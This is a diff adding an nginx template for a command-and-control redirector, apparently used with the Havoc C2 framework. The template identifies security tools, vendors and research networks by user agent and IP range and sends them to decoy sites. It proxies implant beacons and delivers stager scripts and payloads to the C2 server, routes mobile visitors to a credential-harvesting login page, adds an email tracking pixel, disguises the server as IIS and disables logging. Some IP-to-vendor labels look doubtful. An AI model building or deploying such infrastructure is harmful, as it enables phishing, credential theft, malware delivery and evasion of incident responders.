@@ -1,0 +1,298 @@
+# Advanced Redirector Configuration with IR Evasion
+# templates/redirector-site.conf.j2
+
+# Detect security tools by user agent
+map $http_user_agent $is_security_tool {
+    default 0;
+    # Common security tools, scanners, and IR user agents
+    ~*(security|incident|response|virus|malware|cuckoo|wireshark|burp|nessus|qualys|openvas|nmap|tenable|rapid7|metasploit|paros|zap|nikto|scylla|splunk|elastic|defender|crowdstrike|sentinel|cylance|carbon\sblack|fireeye|mandiant|symantec|mcafee|sophos|kaspersky|analyst|forensic|edr|xdr|siem) 1;
+}
+
+# Improved mobile detection regex
+map $http_user_agent $is_mobile {
+    default 0;
+    ~*(android|iphone|ipad|ipod|blackberry|kindle|silk|opera\smini|opera\smobi|windows\sphone|iemobile|mobile|phone|tablet|symbian|series60|midp|up\.browser|ucbrowser|nokia|samsung|motorola|sprint|docomo|mobile\ssafari) 1;
+}
+
+map $remote_addr $is_known_security_ip {
+    default 0;
+    
+    # VirusTotal
+    "64.71.0.0/16" 1;
+    "74.125.0.0/16" 1;      # Google Cloud (VirusTotal)
+    "216.239.32.0/19" 1;    # Google
+    
+    # Recorded Future & SentinelOne (merged - both use Google Cloud)
+    "104.196.0.0/14" 1;     # Google Cloud
+    "35.184.0.0/13" 1;      # Google Cloud
+    
+    # Censys
+    "198.108.66.0/23" 1;
+    "162.142.125.0/24" 1;
+    "167.248.133.0/24" 1;
+    
+    # Shodan
+    "66.240.192.0/18" 1;
+    "71.6.135.0/24" 1;
+    "71.6.167.0/24" 1;
+    "82.221.105.6/32" 1;
+    "82.221.105.7/32" 1;
+    "93.120.27.0/24" 1;
+    
+    # Symantec/Broadcom
+    "205.128.0.0/14" 1;
+    "65.165.0.0/16" 1;
+    
+    # McAfee/Trellix
+    "161.69.0.0/16" 1;
+    "192.225.158.0/24" 1;
+    
+    # CrowdStrike
+    "45.60.0.0/16" 1;
+    "199.66.200.0/24" 1;
+    
+    # SentinelOne
+    "104.36.227.0/24" 1;
+    # "104.196.0.0/14" 1;  # Removed duplicate - already defined for Recorded Future
+    
+    # Microsoft Defender
+    "13.64.0.0/11" 1;      # Azure (Microsoft Defender)
+    "13.104.0.0/14" 1;     # Microsoft
+    "40.74.0.0/15" 1;      # Microsoft
+    "51.4.0.0/15" 1;       # Microsoft
+    "104.40.0.0/13" 1;     # Microsoft
+    "104.208.0.0/13" 1;    # Azure
+    
+    # Palo Alto
+    "96.88.0.0/16" 1;
+    "173.247.96.0/19" 1;
+    "216.115.73.0/24" 1;
+    
+    # Qualys
+    "64.39.96.0/20" 1;
+    "64.41.200.0/24" 1;
+    "92.118.160.0/24" 1;
+    
+    # Rapid7
+    "5.63.0.0/16" 1;
+    "38.107.201.0/24" 1;
+    # "45.60.0.0/16" 1;    # Removed duplicate - already defined for CrowdStrike
+    "71.6.0.0/16" 1;       # Note: This may overlap with Shodan ranges
+    "206.225.0.0/16" 1;
+    
+    # Tenable/Nessus
+    "23.20.0.0/14" 1;      # AWS (Tenable Cloud)
+    "34.192.0.0/12" 1;     # AWS
+    "54.144.0.0/12" 1;     # AWS
+    "162.219.56.0/21" 1;
+    "172.104.0.0/16" 1;    # Linode (common Nessus hosting)
+    
+    # FireEye/Mandiant
+    "23.98.64.0/18" 1;
+    "66.114.168.0/22" 1;
+    "96.43.144.0/20" 1;
+    "173.231.184.0/22" 1;
+    
+    # Akamai
+    "23.0.0.0/12" 1;
+    "23.32.0.0/11" 1;
+    "104.64.0.0/10" 1;
+    
+    # Cloudflare
+    "104.16.0.0/12" 1;
+    "173.245.48.0/20" 1;
+    
+    # Academic Research Networks
+    "128.32.0.0/16" 1;     # UC Berkeley
+    "128.59.0.0/16" 1;     # Columbia University
+    "128.112.0.0/16" 1;    # Princeton University
+    "128.138.0.0/16" 1;    # University of Colorado
+    "128.197.0.0/16" 1;    # Boston University
+    "146.186.0.0/16" 1;    # Carnegie Mellon
+}
+
+# HTTP to HTTPS redirect
+server {
+    listen 80;
+    listen [::]:80;
+    server_name {{ redirector_subdomain }}.{{ domain }};
+    
+    # Redirect to HTTPS
+    return 301 https://$host$request_uri;
+}
+
+# Main HTTPS server
+server {
+    listen 443 ssl;
+    listen [::]:443 ssl;
+    server_name {{ redirector_subdomain }}.{{ domain }};
+    
+    # SSL Configuration
+    ssl_certificate /etc/letsencrypt/live/{{ redirector_subdomain }}.{{ domain }}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{{ redirector_subdomain }}.{{ domain }}/privkey.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_prefer_server_ciphers on;
+    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
+    ssl_session_timeout 1d;
+    ssl_session_cache shared:SSL:10m;
+    
+    # Root directory
+    root /var/www/html;
+    index index.html;
+    
+    # Advanced IR Evasion - IMPORTANT: Order matters!
+    
+    # 1. Direct mobile users to credential capture - placed first to ensure it takes priority
+    if ($is_mobile = 1) {
+        return 302 https://$host/login/auth.html;
+    }
+    
+    # 2. Redirect security tools to benign sites
+    if ($is_security_tool) {
+        return 302 https://www.google.com;
+    }
+    
+    # 3. Redirect known security IPs
+    if ($is_known_security_ip) {
+        return 302 https://www.microsoft.com;
+    }
+    
+    # 4. Add timing delay for suspicious connections
+    if ($http_referer ~* (security|scan)) {
+        set $delay_response 1;
+    }
+    
+    # Valid C2 beacon routing - CRITICAL PATHS
+    location ~ ^/api/beacon/ {
+        # Only valid beacons proceed to C2
+        proxy_pass https://{{ c2_ip }}:{{ havoc_https_port | default(9443) }};
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_ssl_verify off;
+        
+        # Implement artificial delay for suspicious connections
+        if ($delay_response) {
+            limit_rate 1k;  # Slow down response
+        }
+    }
+    
+    # Secure stager delivery routes
+    location ~ ^/(windows|linux)_stager\.(ps1|sh)$ {
+        # Only valid requests that passed the earlier checks
+        proxy_pass http://{{ c2_ip }}:8443/$1_stager.$2;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+    
+    # Content access for payload delivery
+    location ~ ^/content/(windows|linux)/(.+)$ {
+        # Specific valid content paths
+        proxy_pass http://{{ c2_ip }}:8443/content/$1/$2;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    # Secure payload delivery path for synced payloads
+    location /resources/ {
+        alias /var/www/resources/;
+        limit_except GET { deny all; }
+        add_header X-Content-Type-Options "nosniff" always;
+        add_header Content-Security-Policy "default-src 'none'" always;
+        add_header X-Frame-Options "DENY" always;
+        add_header Server "Microsoft-IIS/10.0" always;
+        autoindex off;
+        access_log off;
+    }
+    
+    # Credential harvesting login page
+    location ~ ^/login/auth\.html$ {
+        root /var/www;
+        try_files $uri =404;
+        add_header X-Frame-Options "DENY" always;
+    }
+    
+    # Protect credential processing script
+    location ~ ^/login/process\.php$ {
+        # Allow POST only
+        limit_except POST { deny all; }
+        
+        # Process the PHP file
+        root /var/www;
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+
+    # Block direct access to sensitive files
+    location ~ \.(enc|key|pem|log)$ {
+        deny all;
+        return 404;
+    }
+    
+    {% if setup_integrated_tracker | default(false) | bool %}
+    # Email tracker pixel only (not exposing dashboard)
+    location ~ ^/px/(.+)\.png$ {
+        proxy_pass http://{{ c2_ip }}:5000/pixel/$1.png;
+        proxy_http_version 1.1;
+        proxy_set_header Host {{ tracker_domain }};
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-Proto https;
+        
+        # Cache control for tracking pixels
+        add_header Cache-Control "no-store, no-cache, must-revalidate" always;
+        expires -1;
+    }
+    {% endif %}
+    
+    # Primary location for legitimate website traffic
+    # This acts as a catch-all for non-matching URIs
+    location / {
+        # Check if this is potentially an attempt to access a non-existent payload
+        if ($request_uri ~* \.(exe|dll|ps1|sh|py|vbs|hta)$) {
+            # If invalid payload URI, redirect to real target
+            return 302 https://www.{{ domain }};
+        }
+        
+        # Otherwise serve legitimate content
+        try_files $uri $uri/ =404;
+    }
+
+    # Security headers
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "SAMEORIGIN" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "no-referrer" always;
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
+    
+    # Make server appear as IIS
+    add_header Server "Microsoft-IIS/10.0";
+    
+    # Disable logging
+    {% if zero_logs | default(true) | bool %}
+    access_log off;
+    error_log /dev/null crit;
+    {% endif %}
+}
+
+# Catch-all server block
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    listen 443 ssl default_server;
+    listen [::]:443 ssl default_server;
+    
+    ssl_certificate /etc/nginx/conf.d/selfsigned.crt;
+    ssl_certificate_key /etc/nginx/conf.d/selfsigned.key;
+    
+    # Redirect unknown hosts to legitimate sites
+    return 301 https://www.google.com;
+    
+    access_log off;
+    error_log /dev/null crit;
+}
